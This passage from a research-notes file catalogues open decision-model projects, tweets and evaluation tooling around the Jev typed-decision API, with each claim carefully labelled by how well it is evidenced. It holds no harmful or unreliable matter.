   and readout unchanged. Nothing else depends on it.
7. **Batch branches, not a conversation.** Observed: no dependency chain
   between answers; duplicate questions in one request still differ, so
   do not assume API determinism. That noise does not prove text sampling.
   Inferred: suffixes packed against a shared prefix. A later question
   that needs an earlier answer requires another stage. Code owns that
   transition.

Limits he re-measured — same envelope as §1, **independent probe, not a
new contract**: ~32,768 tokens per branch; ~65,536 per request with state
counted once; at most 255 options, request validation not a measured
256-slot head; non-determinism across duplicates.

**WATCH, not shipped.** Tweet hedges and the hub search are §32.
Weigh "smarter than Jev" against *this* essay: order can cross a ~0.9
threshold, and calibration is in-distribution (§7), not a leaderboard.
The public Qwen3.8-27B checkpoint is a base; the decision-model drop is
not that checkpoint. Laya stays text-only (§18).

Design card and the TypeAR comparison (constrained AR vs this readout;
not a how-to): `judgment-class.md`. IIA / order as a property test:
`formal-methods.md`, `validation.md`. Confidence question: `faq.md`.

## 32. TypeAR — constrained-AR surface (2026-09-18)

[zmtomorrow/TypeAR](https://github.com/zmtomorrow/TypeAR). GitHub API
this pass: description "Type-Safe Decoding for Autoregressive LLMs";
language Python; created 2026-09-17T12:41:27Z; updated
2026-09-18T12:32:37Z; default branch `main` at `a49c320`; README blob
`43f456ae`. `license` null; no LICENSE file in the root listing. HTTP
200 on the repo and on the raw README. **Contract** as that README.
Not a how-to: no install, ports, or client signatures in skill cards.
README names SGLang as the serving stack for a compatible open model;
that name stays in this note.

**What the README actually says.** A typed-decision interface on a
compatible pretrained open autoregressive model, without a proprietary
model API, retraining, or manual KV management. Their serving stack is
named in the README; skill cards do not repeat it. Finite enums at most
16 values. Fields: string / integer / number enums, open integer, open
number (tokenizer-native constrained decoding, update dated 2026/09/18),
boolean. Sequential mode is the default: each later field is conditioned
on earlier selected values. Batch mode forks independent fields after a
shared prefill; the two modes compute different conditionals. Closed
decisions generate one token. With prefix reuse, newly processed input
is O(C + D·S); without it, O(D·C + D²·S); output is O(D + N) where N is
open-numeric tokenizer steps. Probabilities over allowed values; argmax
default; sample mode applies temperature to constrained scores.

**Their throughput number.** One local run: Qwen3.8-27B, K=16 one-token
booleans, sequential 9.35 s vs batch 1.61 s, relative throughput 5.8×.
They call it a single example, not a portable benchmark. **Empirical
only as that self-reported receipt.** Not re-run here.

**Not a sixth species.** Next-token constraint is a different objective
from a proper-scoring decision head (Jev, Laya, openjev-lm). A
constrained distribution is not a Noul. The README schema has no
abstention type. Enum ≤16 plus "must pick" is brittleness: compose with
`mappings.md` §2 and §17, and with a jevgate-shaped structural gate
(§18) before the model is asked. `rh-guard` is not a mapping here.
§30 already records `24601/rh-guard` (README HTTP 200) as a reward-hack
hook, a different hole from jevgate; this card does not cite it.

**Versus Jev fan-out and Ward.** Questions on one Jev request do not
see each other's answers (`question-design.md`; §31 item 7).
TypeAR sequential mode does the opposite. `mappings.md` §19
(effect-oriented state-machine loops) already existed at this write:
code owns transitions. Sequential conditioning is not that machine.
Batch mode is the isolation pattern.

**Composition hypothesis.** TypeAR's example and Hume's announced drop
(§31) both name Qwen3.8 27B. Running this surface on those weights
versus stock Qwen is **Hypothesis** until the weights, license, and
evals exist. Hub search this pass: no model repos under authors
`archerhume` or `4rcherhume`, and none for query "archer hume jev".
Watch list, do not pretend they exist: weights drop, license, eval
claims vs Jev, whether a Noul or abstention exists, candidate-set size
limits. Tweet hedges to keep: "probably like 65% done", "will probably
release tomorrow" (posted 2026-09-18T07:26:10Z — **WATCH**, not
shipped), "seemingly quantises pretty well", "from early experiments
seems to be smarter than Jev (surprisingly)" — a **claim**, not
Empirical gold. Compare, when it exists, to Laya (text-only, §18),
this surface, and jev-visual (region Choice, findings). `note_tweet`
was requested on both posts and was absent; the full text is in `text`.

Card: `judgment-class.md` constrained-AR surface. One FAQ row. One
formal-methods paragraph (open weights vs API; sensor still isn't a
proof).

## 33. Hourly fold ~11:02 America/Boise (2026-09-18) — decision surfaces, HF novel, device/harness

Window: America/Boise ~11:02 ≈ 17:02 UTC. Docs-only. No Jev wrapper, no
serving-stack how-to, no copied `predict()` / env / install. HTTP 200
this pass on every cited Hub card, GitHub README, essay, and X URL
below. Hub authors `archerhume` / `4rcherhume` still have **no** model
repos (empty `?author=` lists). Drop remains **WATCH**, expected ~19 Sep
Boise from the 18 Sep 07:26Z hedge ("will probably release tomorrow").

### Archer Hume — clarifications, still not landed

Status tweet already in §32:
[2100848840643612729](https://x.com/4rcherhume/status/2100848840643612729)
(2026-09-18T07:26:10Z). Specs unchanged: Qwen3.8 27B-based, 265k,
multimodal, no audio, "seemingly quantises pretty well"; "smarter than
Jev" is an early claim against *his* order-sensitivity and in-distribution
calibration warnings (§7, §31). Essay still a reconstruction, not a
TypeSafe contract:
[Jev's Architecture Unmasked](https://archerhume.com/posts/jevs-architecture-unmasked/).

New replies (all `note_tweet` absent; full text in `text`):

1. **Not anti-TypeSafe.** Immediate self-reply
   [2100849091504980126](https://x.com/4rcherhume/status/2100849091504980126):
   "I have nothing against TypeSafe, it's a great idea. I just run a
   healthcare startup which means we need control over deployments, so
   we can't use Jev." Follow-up
   [2100955652025893086](https://x.com/4rcherhume/status/2100955652025893086):
   Australia; "very specific laws about where you can send private data
   (especially health)"; vendors exist, they just have AU infra.
   Deployment control / data-residency, not a product feud.
2. **27B dense for one-forward-pass local speed.**
   [2100856685153935699](https://x.com/4rcherhume/status/2100856685153935699):
   "Chose 27b dense because it has a decent balance of base intelligence
   and small-ish footprint (when you remove AR decoding it's actually
   really fast locally since it's one forward pass). Next step would be
   getting it done with an MoE base, then it's seeing how small I can
   get it." Dense-now, MoE-next, then shrink. Matches the essay's
   inferred readout (item 1) as a *design intent*, still not a shipped
   checkpoint.
3. **Multimodal generalization is a report, not a recipe.**
   [2100950467245387937](https://x.com/4rcherhume/status/2100950467245387937):
   "Weirdly it seems like as long as the base model is multimodal the
   text post training generalises to images pretty well. Doesn't need
   that much intentional training (I think)." Hedge ("I think") stays.
   Laya remains text-only (§18). jev-visual remains region Choice.
4. **Class name.**
   [2100604161821979134](https://x.com/4rcherhume/status/2100604161821979134)
   (17 Sep): "I desperately don't want to call this new paradigm
   'system one models' so if I manage to get an open weight one released
   tomorrow can we all agree to call them decision models?" Follow-up
   "God I hope decision model catches on"
   ([2100616134328459574](https://x.com/4rcherhume/status/2100616134328459574)).
   Augustus keeps TypeSafe's "System One" when quoting the exemplar and
   uses **decision model** / judgment-class for the family. Not a rename
   of this skill.

When-to-use axes (calibration, VOI, latency/$, deployment control,
multimodal, enum size): `judgment-class.md`. FAQ row expanded. Still
Watch until weights, license, and evals exist.

### HF novel (verified this pass)

1. **Local memory-gating LoRA (teacher-copy).**
   [`SargeDev/jev-gate-student-b`](https://huggingface.co/SargeDev/jev-gate-student-b)
   (created 2026-09-18T16:52:35Z, apache-2.0): LoRA r=16 α=32 on
   `Qwen/Qwen2.5-0.5B-Instruct`; P(relevant) from softmax over final-token
   `yes`/`no` logits; no token generated. Card: MAE 0.187 / Pearson 0.791 /
   agreement 90.0% on held-out n=60 vs vanilla 0.5B 0.536 / −0.067 / 38.3%;
   ~59 ms RTX 3060. Corpus
   [`SargeDev/jev-distill-corpus`](https://huggingface.co/datasets/SargeDev/jev-distill-corpus)
   (created 02:14Z, lastModified 16:52Z): datasets-server this pass
   **148,160** train rows; tags `100K<n<1M`. The dataset *card* currently
   duplicates the model card (incl. a 5,605-row test table); row count is
   from the Hub size API, not from that README. Same teacher-copy caution
   as openjev-lm (§25): agreement with Jev labels is not independent gold.
   Card says gate at 0.5 and **fail-open on errors**. Placement: context
   sieve (`applied-mappings.md` §1) beside `kevinpita/pi-jev-context` and
   the Pi compaction family (`tamaratran/fast-jev-compaction`;
   `vava-nessa/pi-jev-compaction` as a named Pi cousin). Do not copy the
   usage snippet into skill cards.

2. **Domain-local categorize (JP SNS).**
   [`kokuren/jp-sns-jev7-estimator`](https://huggingface.co/kokuren/jp-sns-jev7-estimator)
   (created 14:48Z, apache-2.0, ONNX INT8 DistilBERT Japanese): seven
   sigmoid scores (insult, threat, obscene, identity_attack,
   sexual_explicit, targetedness, indirect_hostility). Card's own
   sentence: "continuous distilled teacher scores, **not calibrated
   probabilities**." `threat` F1@0.5 = 0.0000 on their held-out table
   (rare-class; accuracy@0.5 is the wrong summary — `mappings.md` §7).
   Mean Pearson 0.75. Domain-local System One *shape*, still categorize /
   score, not a Noul. Threshold on *your* labels.

3. **Encoder open-jev (not a Jev teacher-copy).**
   [`com-kotobalabs/open-jev-deberta-v3-large`](https://huggingface.co/com-kotobalabs/open-jev-deberta-v3-large)
   (created 10:01Z, apache-2.0, `microsoft/deberta-v3-large` ≈434M):
   Choice ≤255 / Score 2–10 / Noul from **one bidirectional pass**;
   softmax within each question's option group; CE + Brier; post-hoc
   temperature on a validation split. Public gold only (Banking77, SST-5,
   BoolQ) — "no synthetic answers, no teacher model." In-domain 0.854 acc
   / Brier 0.213 / ECE 0.022 (1,500 states / 3,508 questions); OOD 0.690 /
   0.399 / 0.035 (new instructions and option sets). 512 tok total (state
   cut to 256). Author latency: 1.8 s / 4 questions M1 Max CPU fp32;
   28 ms e2e / 10 questions H100 bf16. Code:
   [kotoba-lang/typed-decisions](https://github.com/kotoba-lang/typed-decisions).
   Independent of TypeSafe. Self-eval duty unchanged. Do not copy the
   client signature.

4. **Constrained-decoding / calibration gold (no token generated).**
   [`Mikhail/mini-jev-runs`](https://huggingface.co/datasets/Mikhail/mini-jev-runs)
   (created 12:05Z, MIT): **27,900** schema-driven decisions on frozen
   `Qwen/Qwen3-4B-Instruct-2507`; lettered options; **one forward pass**;
   answer read from next-token logits over option letters; full candidate
   logits kept. Write-up [r-ms/mini-jev](https://github.com/r-ms/mini-jev)
   (20★ this pass). Headline from the card: unconstrained argmax is an
   option letter 13,600/13,600; vs grammar-constrained JSON Δ −0.22 pp
   (CI covers 0); scores "deliberately *not* calibrated." Rotated-options
   split is an IIA / position-prior test surface (`validation.md`,
   `formal-methods.md`). Out-of-scope + "none of the above": 41/50
   reading vs 47/50 generating. Compose with TypeAR (`notes.md` §32):
   same *read-the-letter* graph, different serving claim. Not a how-to.

5. **Hierarchy vs Jev's 255 cap (search / taxonomy / MCDA).**
   [`reachjalil/jev-tree-choice-cap`](https://huggingface.co/datasets/reachjalil/jev-tree-choice-cap)
   (created 01:17Z, MIT): synthetic 320-leaf region→service→mode catalog,
   n=180, seed 20260917, live `typesafe-ai/jev` on Vercel AI Gateway.
   Code [reachjalil/jev-tree](https://github.com/reachjalil/jev-tree).
   Headline: keyword 180/180 (0 calls); authored tree **180/180** (3
   calls); flat+partition 179/180; truncate-to-255 **90/180** and
   **0/90 on the tail** (Cape Town `af-south-1` is past index 255).
   Spend estimate $0.142 at $0.042/M input — author. **Empirical** as
   "truncation silently drops the tail"; **not** a quality win over
   keyword on this invented catalog (keyword also 180/180). Tournament
   brackets stay rejected (`mappings.md` §5). Prefer an authored
   taxonomy or retrieval.

### Device + harness patterns

- [`Friedjof/jev-mobile`](https://github.com/Friedjof/jev-mobile) (MIT,
  Python, 0★ this pass; pushed 16:59Z): durable Android worker, USB
  Portal ADB, **stdio Mobile MCP** for task delegation (`start_task` /
  `get_task` / …). Jev sees prevalidated candidates; it never generates
  coordinates, MCP calls, or code. Perception in code (UI tree /
  companion AccessibilityService). Escalation always available.
  Sensitive/external-effect classes are not autonomous. Previously "thin
  evidence" in `mixed-architecture.md` — the *placement* (pixel-free
  candidates + closed Choice) is now a named recipe; app coverage is
  still Keep/fixture-scoped. Do not copy `.env` or MCP URLs.
- [`jcpsimmons/jev-macos-loop`](https://github.com/jcpsimmons/jev-macos-loop)
  (AGPL-3.0, Apple silicon; created 05:17Z, pushed 16:57Z): OmniParser
  CoreML + Vision OCR + accessibility locally; **text-only** Jev
  decisions; pixels/coordinates stay on the Mac. Finder demo: 9 files →
  3 group moves in 7.39 s, independently verified. 6/6 native GUI tasks
  on Vercel and OpenRouter (small sample, warmup excluded). DONE is a
  model decision; benchmarks check the app. Vision portent 1
  (`judgment-class.md`). Not a how-to.
- [`AntonioCoppe/jev-harness`](https://github.com/AntonioCoppe/jev-harness)
  (already §7 / findings): policy + **confidence gate** + **shadow mode**
  + eval CLI asserting on *actions*. Selective abstention
  (`mappings.md` §2). 24-row filter 48.9 s Claude CLI vs 1.3 s Jev.
  README this pass still that contract. Not a compact-transcript
  replacement (their own "what this is not").
- [`rajdhakad9826/routeKit`](https://github.com/rajdhakad9826/routeKit)
  (MIT, TypeScript, created 15:25Z, 2★): Jev estimates task
  *requirements* (difficulty / reasoningNeed / ambiguity /
  toolComplexity); **code** applies hard constraints (context, tools,
  vision, structured output) and a deterministic policy (cost / quality /
  latency / balanced). Jev does not pick the model. Fallback is
  configured. Early development. Placement: selector + policy
  (`applied-mappings.md` §5). Hypothesis until measured on *your*
  catalog. Do not copy the client signature.

### HacksonClark discourse (SREGym-Lite) — rank tests, do not diagnose

[@HacksonClark](https://x.com/HacksonClark/status/2100993319878721665)
(2026-09-18T17:00:16Z) + blog
[sregym.com/blog/jev-sregym-lite](https://sregym.com/blog/jev-sregym-lite)
(HTTP 200). Codex harness, `gpt-5.6-luna`, 10 SREGym-Lite problems × 5
attempts: **20/50 → 24/50** (40% → 48%). 4 faults improved, **2
regressed**, 4 unchanged. Authors: not a universal 8-point gain.
Biggest lift: internal traffic policy 0/5 → 3/5. Tools: `jev_plan`
ranks 3–5 proposed tests (does not run them, does not reveal the
benchmark answer); `jev_submit` reviews evidence at 0.70 on every
required question before diagnosis/mitigation. **Jev did not diagnose.**
Finding 3: it can only rank hypotheses it receives; a high score cannot
compensate for missing evidence. Finding 2: "healthy now" ≠ durable
repair (quota left in place; unsafe rollout strategy). Future work
(untested): action-loop votes, prospective mitigation-safety.

Placement sentence, same thread
([@Antoniocoppe](https://x.com/Antoniocoppe/status/2100993869680615552)):
"Jev ranks next tests/evidence; it shouldn't diagnose. Keep tests
closed and inspect 2 regressions as calibration failures (was
confidence high on the wrong Choice?). Low-confidence rankings can go
back to the agent instead of silently steering mitigation."

That is VOI / gather (`mappings.md` §6) + selective abstention (§2) +
harness triage (`applied-mappings.md` §3) + dual-orchestration topology
A (Jev-as-tool). Closed candidate set is already a non-negotiable
(`SKILL.md`). Not an SREGym how-to; not a 0.70 to copy.

Cards: `judgment-class.md` when-to-use; FAQ; `applied-mappings.md` §1 /
§3 / §5; `mappings.md` §5 (tree) and §6 (next-test as gather);
`mixed-architecture.md` on-device + routeKit; `validation.md` mini-jev
IIA surface; `formal-methods.md` logit dump still isn't a proof.
## 34. Erik Meijer — not probabilistic programming (2026-09-18)

[Post](https://x.com/headinthebox/status/2100984170004824221) (Erik
Meijer, `headinthebox`, 2026-09-18T16:23:55Z). HTTP 200. X API
`note_tweet` is the full text. It quotes
[jamespearce](https://x.com/jamespearce/status/2100859300038234473)
asking for a take given Meijer's Facebook probabilistic-programming
history. **Claim** as his correction, not a TypeSafe contract.

**What he says.** "I think Jev is a cool API, but it is not
probabilistic programming; qualifying it as a Kleisli arrow that I
have seen people do here is exaggerating." He endorses the gloss:
**"Jev gives you the marginals; a decoder gives you the joint."** In
ordinary words from the note, not a category-theory lesson: N questions
about one fixed state are a fan-out. You get N marginals, not a
distribution over the tuple. The jointly best answer need not be the
tuple of marginally best answers. A later question is read off the
same state, never off an earlier answer, and there is no conditioning
update. He says Jev emits a fixed readout.

**Design card** (`judgment-class.md`). System One / Jev-class =
factorized marginals over typed questions given shared state. That is
§31 item 7 and the compute-graph card, cited, not copied. The joint
lives in application code, sequential TypeAR, or a generative decoder,
not inside one Jev call. Do not market or teach Jev as a probabilistic
programming language or as Kleisli sugar. Frames: decision theory,
calibration, value of information (`mental-models.md`). Joints and
invariants: TLA+ / Alloy / contracts. Fast calibrated factors: System
One. One paragraph there, not a new formal-methods doctrine. A Noul is
still not a proof.

FAQ row. One mental-models sentence. One SKILL.md trigger.

## 35. Bespoke Nimble — open recipe, not a distill (2026-09-18)

HTTP 200 this pass:
[bespokelabsai/nimble](https://github.com/bespokelabsai/nimble) README
(raw `main`),
[bespokelabs/Bespoke-Nimble-9B](https://huggingface.co/bespokelabs/Bespoke-Nimble-9B),
[announcement](https://x.com/madiator/status/2100990591215783946)
(Mahesh Sathiamoorthy, `madiator`, 2026-09-18T16:49:26Z; `note_tweet`
present).

**License.** Model-card frontmatter: `apache-2.0`, `library_name:
peft`, `base_model: Qwen/Qwen3.5-9B`, `base_model_relation: adapter`,
tag `lora`. **Contract** as that card. GitHub API `license` is null;
raw `LICENSE` is HTTP 404. The repository is not Apache-2.0 on the
evidence in hand.

**Recipe (Contract as the README).** They did not distill from Jev.
LoRA on Qwen3.5-9B (rank 16, lr 5e-5, effective batch 8, seed 17, one
epoch, BF16, 2,048-token limit), cross-entropy over allowed candidate
logits, hard reference labels not derived from Jev. Saved Jev
probabilities are described as available for a future soft-target run,
not used in the published objective. Contrastive curation: two examples
differ in one focus fact (at most eight words in one evidence
sentence) so the correct answer flips; question and policy stay.
Labels are synthetic; a model checked them; no person has reviewed
them. `data/train.jsonl` has 2,826 rows; 2,676 trained the published
model, across 10 categories. Holdout `data/eval.jsonl` is 324 examples
(162 pairs, six source families). The tweet adds "No RL yet" and
"calibration is implicit." The README says temperature was not tuned
so probabilities match how often answers are right. Implicit
calibration is a **claim**, not a measured ECE.

**Holdout agreement (Empirical as their named receipt, not a
ranking).** Same 324 synthetic labels. Not re-run here.

| Model | Matches | Agreement |
|---|---:|---:|
| Jev 1.13.0 | 302/324 | 93.21% |
| Bespoke-Nimble-9B | 292/324 | 90.12% |
| Qwen3.8-27B (untuned, their word) | 275/324 | 84.88% |
| Qwen3.5-9B base | 215/324 | 66.36% |

The announcement rounds these to about 93 / 90 / 66. The infographic
rounds to 93.2 / 90.1 / 66.4. The table is the receipt. They call the
test narrow. Jev figures are a reused API run; Nimble figures a reused
earlier H100 run. **Hypothesis:** a 9B open LoRA is enough versus
proprietary Jev on your labels. The 3.09-point gap on this set is an
existence proof that the gap can be small, not an ordering.

**Serving (README; not copied into skill cards).** Candidate codes are
one token; logits become probabilities by softmax. On Mac,
`ParallelScorer` processes the shared context once, then scores
fields. The CUDA scorer repeats the full prompt per field. Fields
cannot see each other. Text only, even though the base model has a
vision part. An enum has 1 to 26 choices. Prompts over 2,048 tokens
are rejected, not truncated. Probabilities sum to 1 over the supplied
candidates and are not a correctness guarantee; add an answer that
means "no match" if none may fit. That is the standing
Choice-conditional-on-offered-set boundary, pointed at, not restated.
The tweet's "100ms on H100" is not the table: Nimble median 106.0 ms
on 120 H100 examples, and 444.0 ms median on an M5 Pro for all 324.
"Parallel constrained decoding" is the announcement's name for the
serving idea; the README mechanism is candidate-logit scoring. Do not
promote 100ms.

**Placement.** (a) open training recipe for the class; (b) contrastive
curation beside RLCD, not a replacement; (c) Hypothesis until your
labels; (d) jevals bake-off candidate beside Laya / openjev-lm /
TypeAR. Not a how-to. Card: `judgment-class.md`. One sentence:
`validation.md`.

## 36. djev-spark — diffusion backbone, Jev-shaped I/O (2026-09-18)

[mmastrac/djev-spark](https://github.com/mmastrac/djev-spark) README
HTTP 200. GitHub API license null. Description: "DiffusionGemma NVFP4
structured decisions on a DGX Spark: container recipe." Pushed
2026-09-18T17:03:19Z.

**What the README says (Contract as that file).** DiffusionGemma
26B-A4B (NVFP4) on a DGX Spark, or another GB10 box. A container runs
an engine with structured-reads patches and a server that speaks Jev's
`POST /v1/systemone`. Patches cited as
[vllm-project/vllm#57250](https://github.com/vllm-project/vllm/pull/57250)
(HTTP 200; patch body not reviewed) on fork branch
`structured-reads-spark` (HTTP 200). `model` is ignored. No API key
unless one is set. Images are an extension: the README says Jev's API
has no images; this server takes multipart or JSON base64, ahead of
the state. `think` and `sequential` need a text-only state and return
422 with images. `sequential` (default false) runs chunks so later
answers condition on earlier ones. `think` (default 0) allows tokens
before the read. `samples` defaults to `"auto"`: one read, then more
if entropy is above `auto_threshold` (default 0.1), up to `auto_max`
(default 4). Latency tables on one GX10, dated 2026-09-18, are
**their** receipt — not re-run, not a class benchmark. Do not copy
routes, ports, env, or patches into skill cards.

**Status.** **Empirical** as a public repo and interface claim.
**Hypothesis** that diffusion structured reads beat a trained decision
head on your task. Third compute graph for Jev-shaped I/O: trained
decision-only transformer, constrained AR (TypeAR, §32), this.
Image-in System One without waiting on Hume's audio-less drop, which
stays **WATCH** (§31). Not a new species. The holes table in
`judgment-class.md` is extended with this graph; the seven-point essay
is not rewritten.

## 37. Light discourse — "welcome back ResNet-50" (2026-09-18)

[tenderizzation](https://x.com/tenderizzation/status/2100766765043343689)
(2026-09-18T02:00:01Z, HTTP 200, no `note_tweet`; the `text` field is
the whole post): "when they said it was a classification model it
suddenly all made sense. welcome back ResNet-50." Cultural landing of
"it's just classification." Not a design card. The FAQ already answers
that question and was not expanded.

## 38. Alex Atallah — entropy buckets as an allocator (2026-09-18)

Two posts, Alex Atallah (`alexatallah`, OpenRouter CEO). Direct X fetch
was HTTP 403. Both verified via `api.fxtwitter.com` (`code` 200), and
the later post's `quote` object is the earlier post.

- [Buckets](https://x.com/alexatallah/status/2099511056989147147)
  (2026-09-14T14:50:17Z). He tells customers to decompose AI tasks into
  three buckets: low entropy, example "who should review this PR";
  medium, example "review this PR"; high, example "write a PR". He
  thinks today you only need frontier models for the third. Two photos
  attached (OpenRouter "Log Cost vs Log Usage by Category"). Bands are
  labeled Deterministic / Semi-variable / Variable. One overlay points
  programming at code scanning, code review, and code writing. Axis
  figures and the other category dots were not transcribed. Not a
  benchmark. Not copied into the card.
- [Quote](https://x.com/alexatallah/status/2100962947711295557)
  (2026-09-18T14:59:35Z), quoting the first. Claim, his words in short:
  Jev by TypeSafe is the first model ever to truly optimize for low-
  and medium-entropy tasks. **Claim**, not an Empirical fact. No
  `note_tweet`.

**Design card** (`judgment-class.md`, entropy as allocator;
when-to-use pointer). Map the work before the model. Typed low- and
medium-entropy *decisions* → System One / Jev-class, factorized
marginals (Meijer, §34: not a probabilistic program, not Kleisli).
High-entropy *synthesis* → a generative frontier decoder, the joint.
Same axis as VOI / compute budget (`mental-models.md`). Agent loop:
many cheap low-entropy scorers per turn; a high-entropy write is rare
and downstream. Code fuses the marginals.

**Caveat (load-bearing).** "Review this PR" as medium entropy is still
partly generative. Treat Atallah's buckets as product rhetoric that
needs a decision-versus-generation cut, not a literal entropy meter.
"First model ever" is a claim, not an Empirical fact.

Formal methods, one sentence: low- and medium-entropy decisions are
where contracts, property tests, and gates attach; high-entropy
writing is where specs stay soft. Not a new mappings §N (§19 stays
Ward). **Hypothesis** until a labeled act/outcome log shows the cut
beats a frontier model on every bucket, on your costs. No API, port,
env, or CLI.

## 39. Perception specialist then judgment specialist (2026-09-18)

**Attribution.** Basit ask, primary post not retrieved. Searched X
(`Basit` + Jev/SAM; `SAM 3.1` + Jev) and the web on 2026-09-18. The
token "basit" mostly hit Turkish "simple," not a person. No tweet id
invented. The design card is **Hypothesis** from that ask, not from a
verified post.

**SAM 3.1 is Meta Segment Anything 3.1 (verified name, not a copied
API).** [facebook/sam3.1](https://huggingface.co/facebook/sam3.1) HTTP
200 (gated raw README 401). [RELEASE_SAM3p1.md](https://github.com/facebookresearch/sam3/blob/main/RELEASE_SAM3p1.md)
HTTP 200: Object Multiplex, shared-memory joint multi-object tracking,
checkpoints on that Hub repo, 27 Mar 2026. [Meta blog](https://ai.meta.com/blog/segment-anything-model-3/)
HTTP 200. Output of the species is masks and tracks. **Perceive.**
Not a SAM tutorial. No routes, ports, or install copied.

**ASR + Jev** is the same composition: a transcript is perceive;
System One decides on utterances. Independent public instance, not
Basit: [Moritz Kremb](https://x.com/moritzkremb/status/2100577979021832365)
(2026-09-17T13:29:51Z, `note_tweet` present). Talk → transcript → Jev
probabilities → browser click. His ~300 ms and $0.0002 are his
receipt, not a class number.

**Not native omni System One.** Information dies at the interface: the
decision call sees the schema you serialized, not the pixels or the
waveform. Prefer a shared multimodal decision model when the joint
signal matters. Archer Hume stays **Watch** (no Hub weights this pass;
multimodal, no audio; do not promote to Empirical). djev-spark images
are the third compute graph (§36): multipart or JSON; think and
sequential reject images. Future audio-capable shared models are the
same hole.

**Fits the allocator, does not restate it.** Low/medium entropy (§38)
is product rhetoric for "specialist state, then a typed decision," not
a meter. "Review this PR" stays partly generative. One Jev call is
still Meijer's factorized marginals (§34); the joint of the raw signal
and the decision lives outside the call. Not a probabilistic program.
Not Kleisli. A Noul is not a proof and is not over raw pixels or raw
audio. The handoff is a contract surface — one sentence in
`formal-methods.md`. Code owns the schema and the act.

Card: `judgment-class.md`. One composition sentence:
`mental-models.md`. SAM and ASR are upstream producers, not the
perceive species; Jev on that state is decide. Composition ≠ one model.
Corrected in §43; the first draft of this section called them perceive.

## 40. Eval & hill-climb — jevals practices + Harbor substrate (2026-09-18)

**Attribution.** Basit standing order: imbue jevals practices and Harbor
as the ideal measurement / hill-climb substrate, while Augustus stays
design judgment. Primary post not retrieved. X search for Basit +
jevals/Harbor returned nothing. No tweet id invented. Clauses the
fetched docs do not state are labeled "Basit ask, primary post not
retrieved."

**Jevals files fetched** at commit `af6fecc` (GitHub contents API):

- [README](https://github.com/dayhaysoos/jevals/blob/af6fecc0776dd5d97d5dc89fc0a72cae5e3e2580/README.md)
  — local MIT workbench; Noul / Choice / Score and combinations;
  documented entry is `npx jevals`. Not copied beyond that one fact.
- [PRODUCT.md](https://github.com/dayhaysoos/jevals/blob/af6fecc0776dd5d97d5dc89fc0a72cae5e3e2580/PRODUCT.md)
  — correctness separate from model probability; compare only equivalent
  case sets; editable cases and immutable runs; only fully successful
  runs qualify as best. An earlier sentence says Score execution is
  future work; a later sentence says Noul, Choice, and Score are
  enabled, and README/DESIGN treat Score as present. Taught as enabled.
  PRODUCT also says no npm publication; the README is what documents
  the entry command. Not reconciled further.
- [DESIGN.md](https://github.com/dayhaysoos/jevals/blob/af6fecc0776dd5d97d5dc89fc0a72cae5e3e2580/DESIGN.md)
  — stable question IDs; best-run labels only for complete runs on the
  same case set; no blended accuracy across evaluations; question-scoped
  ranking; confidence describes the distribution rather than establishing
  correctness; Choice multiclass Brier; Score MAE and within-tolerance;
  unset expectation blocks a run; runs open immutable snapshots.
- [skills/jevals/SKILL.md](https://github.com/dayhaysoos/jevals/blob/af6fecc0776dd5d97d5dc89fc0a72cae5e3e2580/skills/jevals/SKILL.md)
  — paraphrased, not copied. WebMCP order: discover → define → author
  independent keys → save/verify → run → inspect. No dedicated split
  control (separate held-out Jeval). Do not encode unsupported
  `unknown` labels. README, PRODUCT, and DESIGN do not themselves say
  "no built-in split"; the skill does, and those three files do not
  document one.

**Dropped or narrowed.** Did not paste flags, env, or ports. Did not
claim PRODUCT/DESIGN/README contain the words "no built-in split" or
"unknown" — those limits are the agent skill, plus DESIGN's unset
expectation. Did not invent a Harbor CLI.

**Harbor / verifiers (verified, not previously named in this repo).**

- [harbor-framework/harbor](https://github.com/harbor-framework/harbor)
  README: Terminal-Bench creators; evaluate and optimize agents;
  shared benchmarks; parallel environments; rollouts for RL.
- [Task structure](https://www.harborframework.com/docs/tasks): default
  verifier shares the agent container. Separate verifier environment
  when grading must not be visible; sidecar evidence from a filesystem
  the agent container cannot write.
- [PrimeIntellect-ai/verifiers](https://github.com/PrimeIntellect-ai/verifiers)
  (Will Brown) and
  [verifiers v1](https://www.primeintellect.ai/blog/verifiers-v1)
  (Will Brown, Mika Senghaas, Florian Brand, 2026-07-10): taskset =
  data, tools, scoring; harness = rollout program; runtime = where it
  runs. Harbor is a taskset format inside verifiers, not a second
  product.

**Basit ask, not in those docs.** Write the score before picking a
model (the blog does put scoring on the taskset). Room driver and live
Room as harness/runtime examples. If only one harness passes, you
measured the harness. HoH: Planner (no code) → Developer (single
writer) → QA (read-only, evidence E); next loop from (A, E). Room/omni:
structural gates first, video-as-judge last. Composes with §39
(information dies at the interface; Noul is not over raw pixels) and
with `mappings.md` §18.

**Does not contradict.** Meijer: marginals, not a PPL, not Kleisli.
Nimble: not a Jev distill; model card Apache-2.0; repo LICENSE 404;
holdout is agreement, not ECE. djev-spark stays a third graph. TypeAR
is constrained AR. openjev-lm keeps that name. Atallah buckets stay
rhetoric; "first model ever" stays a claim. Archer stays Watch (no Hub
weights as of 2026-09-18). "9B LoRA enough vs Jev" stays Hypothesis.
LLM-as-judge is not the primary System One score. rh-guard is one
composition-table row, not a jevgate rewrite.

**Shorter hill-climb card, upgraded, not deleted.** A concurrent fold
had a pipeline / measure / hill-climb card. Its one-liner is the Order
line of `validation.md` Eval & hill-climb. Kept from that card, not
restated as a second essay: stages (perceive → optional fusion →
typed marginals → policy in code); versioned handoff contract; stage
metrics IoU, track IDF1, WER, plus decision Brier/ECE and policy
regret; frozen taskset; falsifiers (contrastive pair, garbage-in,
TOCTOU); HoH changes one stage or one interface; climb axes include
collapsing to a shared multimodal model only when interface loss
stalls end-to-end. DSPy/Ax remain the LM-program slice only.

**Skill.** One section: `validation.md` Eval & hill-climb. Pointers in
SKILL.md (triggers, index, card field), when-to-use, mental-models
calibration, optimizer-integration (no API shapes). No second table.

Card is **Contract** as the fetched workbench and Harbor/verifiers
docs, **Hypothesis** as the Basit loop (HoH, Room, video-last) until
the post is retrieved. Not a how-to.

## 41. Pipeline, measure, hill-climb perception into a decision (2026-09-18)

**Attribution.** Same Basit ask as §39 and §40, a different question:
how to pipeline, measure, and hill-climb perception into a decision,
and the narrow Ax versus DSPy answer. Primary post not retrieved.
Searched X (`Basit` + SAM/Jev; `SAM` + Jev) and the web on 2026-09-18.
No tweet id invented. Do not treat §40's HoH paraphrase (Planner writes
no code) as replaced. This note's hill-climb is the stage reading:
Planner writes a bounded change from evidence; Developer changes one
stage or one interface; QA is read-only on a frozen taskset and emits
the next evidence.

